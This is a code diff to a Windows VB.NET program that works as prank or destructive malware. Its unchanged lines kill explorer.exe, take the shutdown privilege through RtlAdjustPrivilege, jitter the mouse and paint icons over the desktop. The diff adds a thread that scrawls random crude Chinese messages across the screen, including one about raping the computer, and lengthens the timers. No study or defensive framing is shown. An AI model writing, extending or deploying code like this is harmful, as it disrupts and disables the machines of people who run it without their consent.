@@ -4,6 +4,7 @@ Imports System.IO
 Imports System.Media.SoundPlayer
 Imports 反色模块
 Imports System.Reflection
+Imports System.Collections.Generic
 
 Public Class Form2
     Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
@@ -12,6 +13,10 @@ Public Class Form2
     Public Declare Function GetDesktopWindow Lib "user32" () As Long '获得整个桌面绘制
     Public Declare Function SetCursorPos Lib "user32" (ByVal x As Integer, ByVal y As Integer) As Integer '设置鼠标位置。
     Public Declare Function Beep Lib "kernel32" (dwFreq As Integer, dwDuration As Integer) As Integer
+    Public list As New List(Of String) From {"如花正在强建你的电脑", "如花正在强吻你的电脑", "如花正在强暴你的电脑", "嘿嘿嘿嘿"} '集合的表示方法
+    Public list2 As New List(Of Brush) From {Brushes.White, Brushes.Yellow, Brushes.Red, Brushes.Pink, Brushes.Green}
+    Public list3 As New List(Of FontStyle) From {FontStyle.Regular, FontStyle.Italic, FontStyle.Bold, FontStyle.Underline, FontStyle.Strikeout}
+    Public Random As New Random '定义取随机值函数(性能比rnd好，函数不消耗CPU)
     'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
     Dim z As Long
     Dim a As Long
@@ -113,9 +118,12 @@ Public Class Form2
         newthread2.Start()
         Dim newthread4 As New Threading.Thread(AddressOf Icoc)
         newthread4.Start()
+        Threading.Thread.Sleep(1000 * 60)
+        Dim newthread5 As New Threading.Thread(AddressOf Fontcrazy)
+        newthread5.Start()
         'Dim newthread3 As New Threading.Thread(AddressOf Playsound)
         'newthread3.Start()
-        Threading.Thread.Sleep(1000 * 60 * 3)
+        Threading.Thread.Sleep(1000 * 60 * 4)
         Shell("taskkill /im explorer.exe /f", 0)
         Threading.Thread.Sleep(1000 * 60)
         RtlAdjustPrivilege(&H13, &H1, &H0, &H0)
@@ -128,8 +136,8 @@ Public Class Form2
     End Sub
 
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
-        Me.Top = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2
-        Me.Left = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7
+        Me.Top = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2)
+        Me.Left = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7)
     End Sub
     Sub Drowerror()
         Threading.Thread.Sleep(10000)
@@ -138,7 +146,7 @@ Public Class Form2
         Dim where
         Do
             where = System.Windows.Forms.Control.MousePosition '获得当前鼠标位置
-            SetCursorPos(CDbl(where.x) + 5 * (-1) ^ Int(1 + 2 * Rnd()), CDbl(where.y) + 5 * (-1) ^ Int(1 + 2 * Rnd())) 'Set mouse position
+            SetCursorPos(CDbl(where.x) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
             Threading.Thread.Sleep(50) 'stop 0.05 second
         Loop
     End Sub
@@ -166,9 +174,9 @@ again:
 
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
         a = a + 1
-        If a = 60 Then
+        If a = 120 Then
             Timer3.Start()
-        ElseIf a = 180 Then
+        ElseIf a = 240 Then
             Timer1.Start()
         End If
     End Sub
@@ -229,22 +237,35 @@ again:
         Dim ico6 As Bitmap = My.Resources.Resource1.f.ToBitmap
         Dim ico7 As Bitmap = My.Resources.Resource1.g.ToBitmap
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
-        Threading.Thread.Sleep(1000 * 20)
+        Threading.Thread.Sleep(1000 * 40)
         Do
-            screen.DrawImage(ico1, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico1, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico2, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico2, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico3, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico3, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico4, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico4, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico5, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico5, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico6, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico6, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico7, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height)
+            screen.DrawImage(ico7, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
+        Loop
+    End Sub
+    Sub Fontcrazy()
+        Threading.Thread.Sleep(1000 * 20)
+        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
+        Do
+            Dim msg As String = list.Item(Random.Next(list.Count - 1)）
+            Dim color As Brush = list2.Item(Random.Next(list2.Count - 1))
+            Dim fontsyle As FontStyle = list3.Item(Random.Next(list3.Count - 1))
+            Threading.Thread.Sleep(100)
+            Dim rect As Rectangle = Windows.Forms.Screen.PrimaryScreen.WorkingArea '获得屏幕大小
+            Dim font As Font = New Font(SystemFonts.MessageBoxFont.FontFamily, Random.Next(1, 25), fontsyle) '设置字体大小取随机值
+            screen.DrawString(msg, font, color, New PointF(Random.Next(rect.Width), Random.Next(rect.Height)))
         Loop
     End Sub
 End Class
